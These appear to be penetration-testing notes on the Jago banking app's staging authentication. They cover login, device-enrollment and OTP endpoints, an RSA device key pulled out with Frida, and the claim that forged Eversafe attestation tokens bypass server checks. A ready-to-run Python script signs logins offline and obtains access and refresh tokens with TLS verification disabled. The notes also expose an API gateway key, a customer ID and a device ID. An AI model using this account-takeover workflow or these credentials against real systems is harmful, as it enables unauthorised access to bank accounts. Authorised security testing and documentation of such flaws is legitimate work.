# Jago App Auth Flow & Interception Notes

## Authentication Architecture

Jago uses **Ory Kratos** for session management with RSA device-bound signatures.

### Login Flow (BFF endpoints on stg-mobile.jago.com)
1. `POST /bff-mobile/auth/mobile/v1/login` — body: `{username, deviceId, signature, timestamp, loginMethod, isScreenCasting, packageName, flag, location}`
2. `signature` = RSA-SHA256 sign of `"{deviceId}:{timestamp_ms}"` using device private key
3. Response returns `tokenId` (ory_st_* session token, ~5min TTL)
4. `POST /bff-mobile/auth/mobile/v1/access-token` — body: `{tokenId}` → returns `{accessToken, refreshToken}`
5. `POST /bff-mobile/auth/mobile/v1/refresh-token` — body: `{refreshToken}` → returns new `{accessToken, refreshToken}`

### Required Headers (all BFF endpoints)
```
Host: stg-mobile.jago.com
Content-Type: application/json
Accept-Api-Version: resource=1.0, protocol=1.0
X-Tyk-Auth: 5ebd293112b13b3491a01eb8ab861048391047d2a107699f5780e629
X-Device-Id: c49d67f491482194
X-Device-Model: Mi MIX 2
X-Build: 9624
X-Build-Version: 8.86.0
X-Eversafe-Verification-Token: <fresh token from SDK>
```

### RSA Device Key (EXTRACTED via Frida)
- Algorithm: SHA256withRSA, 2048-bit PKCS8
- Storage: SOFTWARE key (not hardware-backed TEE)
- Encrypted in `cipherImplementationKeystore.xml` (SharedPreferences)
- AES-CBC encrypted, AES key wrapped by Android Keystore key (`get_packagedkatalis.cipher.com`)
- Extraction method: Frida spawn + hook `javax.crypto.Cipher.doFinal` at app init
- The `CipherImplementation.encrypt(plainText)` calls `RsaImplementation.sign(plainText, rsaPrivateKey)`
- Public key sent to server during device enrollment

### Token Properties
- JWT access tokens: 300s (5min) TTL, issuer=`stg-tyk-internal-gateway.bankartos.io/kratos-retail`
- JWT claims: `customerId`, `cif`, `scope:[openid,profile,basic_customer]`, `realm:/customers`
- Session tokens (`ory_st_*`): same ~5min window
- Refresh tokens: longer TTL (exact unknown), can be replayed
- Device binding: signature validated server-side against registered public key

### Eversafe Verification Token
- Generated by Everspin SDK (kr.co.everspin.eversafe)
- Called via Flutter MethodChannel: `jago.digitalbanking.com/eversafe/methodChannel` → `getVerificationToken`
- Native callback: `EversafeHelper.GetVerificationTokenTask().setTimeout(10000).execute()`
- Token is base64-encoded binary blob (~800-1200 chars)
- **Very short TTL** — likely 30-60 seconds. Must fire API within seconds of generation.
- Backend STRICTLY validates: empty, missing, or garbage tokens all return 401
- Dart fallback: returns `''` on error (backend rejects empty)

### Implications for Testing
- RSA key extracted → can sign login payloads offline
- **Eversafe token is NO LONGER a blocker** — forged TLV tokens bypass server-side verification (see `references/eversafe-attestation.md` → Token Forgery)
- Login endpoint (`/auth/mobile/v1/login`) doesn't even check eversafe — only RSA signature
- Enroll-device endpoint accepts forged tokens → can register new devices without the SDK
- **Full standalone auth possible:** forge eversafe + sign with RSA key + call API = no device needed
- For new accounts (no RSA key yet): forge eversafe → enroll-device → register your own RSA key → login

### Enrollment Flow (confirmed 2026-06-02)
- Endpoint: `POST /auth/v1/enroll-device/init` OR `POST /auth/v2/enroll-device/init` (both work)
- Required body: `{"username":"<CUSTOMER_ID>","password":"<password>","deviceId":"<any_hex>","deviceName":"<model>","otpChannel":"SMS"}`
- **`deviceName` field is REQUIRED** — omitting it causes "Invalid request"
- **Use `otpChannel: "SMS"`** — WhatsApp channel has routing issues with verify-otp (see OTP Verification section)
- `username` field accepts customer login ID (e.g., LLVGL3M8Q6), NOT phone number
- `deviceId` can be ANY string (doesn't need to be a real device) — enables arbitrary device enrollment
- Response: `{sessionId, skip2Fa, otpPrefix, customerLoginId, customerType, deviceWhitelistStatus, phoneNumber}`
- Session IDs have format `jgrd-<uuid>` (Jago Registration Device)
- SMS channel on original device gives `skip2Fa: true` + `otpPrefix: "RuS"`
- OTP format: `<prefix>-<6digits>` (e.g., `RuS-456427`)

### OTP Verification
- Endpoint: `POST /auth/v1/enroll-device/verify-otp`
- Body: `{"otp":"<6-digit>","sessionId":"<jgrd-uuid>"}`

**SMS channel is the key:** Using `"otpChannel":"SMS"` on the ORIGINAL enrolled device gives `"skip2Fa":true` in the response AND the verify-otp endpoint actually finds the session. WhatsApp channel creates sessions that verify-otp can't find (routing mismatch between microservices).

**Working flow (confirmed 2026-06-02):**
1. `POST /auth/v1/enroll-device/init` with `otpChannel: "SMS"` + original device ID → 200 OK, `skip2Fa: true`, `otpPrefix: "RuS"`
2. Receive SMS OTP (format: `RuS-NNNNNN`)
3. `POST /auth/v1/enroll-device/verify-otp` with `{"otp":"NNNNNN","sessionId":"jgrd-..."}` → **204 No Content (SUCCESS)**

**WhatsApp channel quirks (DO NOT USE for scripted enrollment):**
- Sessions created with `otpChannel: "WHATSAPP"` are NOT findable by `verify-otp`
- The WhatsApp callback (`GET /auth/v1/otp/whatsapp-callback/{sessionId}`) returns 200 empty = session exists in callback service but verify-otp microservice can't see it
- `POST /auth/v2/enroll-device/verify-otp` returns 403 "Requested endpoint is forbidden" (not exposed via Tyk)
- Multiple enrollments with WhatsApp DON'T send new OTPs (rate-limited to 1 active session)

### Device Registration (POST /auth/v1/enroll-device) — SOLVED 2026-06-02

After verify-otp succeeds (204), register device with RSA public key:

```
POST /auth/v1/enroll-device HTTP/2
Host: stg-mobile.jago.com
Headers: standard + fresh Eversafe token

Body:
{
  "sessionId": "jgrd-xxxx-xxxx-xxxx",
  "device": {
    "deviceName": "Xiaomi Mi MIX 2",
    "isPhysicalDevice": true,
    "deviceOSType": "ANDROID",
    "token": "",
    "manufacturer": "Xiaomi",
    "machineName": null,
    "deviceModel": "Mi MIX 2",
    "deviceId": "c49d67f491482194",
    "publicKey": "<RSA public key base64, NO PEM headers/footers>",
    "ablyDeviceIds": [""]
  }
}

Response 200:
{"tokenId": "ory_st_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", "devices": null}
```

**Critical notes:**
- Body is NOT flat — `device` is a nested object (static analysis was misleading)
- `publicKey` is raw base64 of the DER-encoded SubjectPublicKeyInfo (strip `-----BEGIN/END PUBLIC KEY-----` and newlines)
- `token` = empty string (FCM push token, not required for enrollment)
- `machineName` = null (iOS-specific field)
- `ablyDeviceIds` = `[""]` (not empty array — one empty string element)
- **The returned `tokenId` (ory_st_*) goes directly to `/auth/mobile/v1/access-token`** — this gives JWT + refresh token
- This body format was only discoverable from Burp proxy history (HTTP Toolkit capture of real app enrollment)

### API Gateway Routing Notes
- **HTTP/2 required** — HTTP/1.1 to stg-mobile.jago.com returns Cloudflare 400 Bad Request
- **`bff-mobile/` prefix does NOT exist on the gateway** — Tyk strips it; use paths without the prefix (e.g., `/auth/v1/...` not `/bff-mobile/auth/v1/...`)
- **stg-api.jago.com** returns 404 for bff-mobile paths — different service routing
- Tyk rate limit headers present but set to `-1` (unlimited) on staging

## Python Auth Script (standalone, no Frida)

Once you have a fresh eversafe token (from HTTP Toolkit), this script handles login → access-token in one shot:

```python
import requests, base64, time, json
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

# RSA private key (PKCS8 base64, extracted via Frida Cipher.doFinal hook)
PRIVATE_KEY_B64 = "<paste full base64 key here>"

HEADERS = {
    "Content-Type": "application/json",
    "Accept-Api-Version": "resource=1.0, protocol=1.0",
    "X-Tyk-Auth": "5ebd293112b13b3491a01eb8ab861048391047d2a107699f5780e629",
    "X-Device-Id": "c49d67f491482194",
    "X-Device-Model": "Mi MIX 2",
    "X-Build": "9624",
    "X-Build-Version": "8.86.0",
}
BASE = "https://stg-mobile.jago.com/bff-mobile"
CUSTOMER_ID = "LLVGL3M8Q6"
DEVICE_ID = "c49d67f491482194"

def sign_login(device_id, timestamp_ms):
    key_bytes = base64.b64decode(PRIVATE_KEY_B64)
    private_key = serialization.load_der_private_key(key_bytes, password=None)
    plaintext = f"{device_id}:{timestamp_ms}"
    signature = private_key.sign(plaintext.encode(), padding.PKCS1v15(), hashes.SHA256())
    return base64.b64encode(signature).decode()

def login(eversafe_token):
    ts = int(time.time() * 1000)
    sig = sign_login(DEVICE_ID, ts)
    h = {**HEADERS, "X-Eversafe-Verification-Token": eversafe_token}
    body = {
        "username": CUSTOMER_ID,
        "deviceId": DEVICE_ID,
        "signature": sig,
        "timestamp": ts,
        "loginMethod": "PIN",
    }
    r = requests.post(f"{BASE}/auth/mobile/v1/login", json=body, headers=h, verify=False)
    print(f"Login: {r.status_code}")
    return r.json()

def get_access_token(token_id, eversafe_token):
    h = {**HEADERS, "X-Eversafe-Verification-Token": eversafe_token}
    body = {"tokenId": token_id}
    r = requests.post(f"{BASE}/auth/mobile/v1/access-token", json=body, headers=h, verify=False)
    print(f"Access-token: {r.status_code}")
    return r.json()

def refresh(refresh_token, eversafe_token):
    h = {**HEADERS, "X-Eversafe-Verification-Token": eversafe_token}
    body = {"refreshToken": refresh_token}
    r = requests.post(f"{BASE}/auth/mobile/v1/refresh-token", json=body, headers=h, verify=False)
    print(f"Refresh: {r.status_code}")
    return r.json()

if __name__ == "__main__":
    import sys
    ev_token = sys.argv[1] if len(sys.argv) > 1 else input("Paste eversafe token: ")
    resp = login(ev_token)
    if "tokenId" in resp:
        tokens = get_access_token(resp["tokenId"], ev_token)
        print(json.dumps(tokens, indent=2))
    else:
        print("Login failed:", resp)
```

**Usage:** `python3 jago_auth.py <eversafe_token>` — must run within 30s of token capture.

## Interception Method: HTTP Toolkit

Jago is Flutter + Eversafe (kills Frida/redsocks processes). HTTP Toolkit works because:
- System-wide transparent proxy (no per-app hooking needed)
- No Frida injection required (Eversafe can't detect it)
- Captures all HTTP/HTTPS traffic including Flutter's BoringSSL
- Requires: HTTP Toolkit Android VPN app installed on device

### Setup
1. HTTP Toolkit desktop running on host
2. HTTP Toolkit Android app connected (VPN mode)
3. System CA trust installed (or use Android <7 / user-cert patch)
4. Flutter traffic visible without reFlutter or Frida SSL bypass

### Workflow for Live Testing
1. Open HTTP Toolkit, ensure device connected
2. Trigger action in Jago app
3. Copy fresh Bearer token from captured request
4. Use token immediately in test scripts (before expiry)

## Cipher Module (com.dkatalis.cipher)

Source: `module_cipher/android/src/main/kotlin/com/dkatalis/cipher/`

- `KeyStoreImplementation.kt` — Android Keystore RSA key (alias: `get_packagedkatalis.cipher.com`), PURPOSE_ENCRYPT/DECRYPT only, used for AES key wrapping
- `RsaImplementation.kt` — Software RSA 2048, SHA256withRSA signing, PKCS8 key from base64 string
- `CipherImplementation.kt` — Orchestrates: AES key (wrapped by Keystore) decrypts RSA pub/priv from SharedPrefs
- `CipherPlugin.kt` — Flutter MethodChannel bridge (`cipher` channel)
- `DataStoreService.kt` — Backup key storage
